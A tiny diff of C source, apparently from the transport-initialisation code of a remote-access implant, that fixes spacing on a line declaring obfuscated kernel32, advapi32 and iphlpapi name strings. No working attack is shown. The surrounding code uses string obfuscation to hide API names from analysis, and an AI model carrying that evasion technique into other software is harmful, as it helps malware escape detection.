@@ -56,7 +56,7 @@ BOOL TransportInit( ) {
 
 #if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
-    unsigned char s_kernel32[] =S_KERNEL32;
+    unsigned char s_kernel32[] = S_KERNEL32;
     unsigned char s_advapi32[] = S_ADVAPI32;
     unsigned char s_iphlpapi[] = S_IPHLPAPI;
 
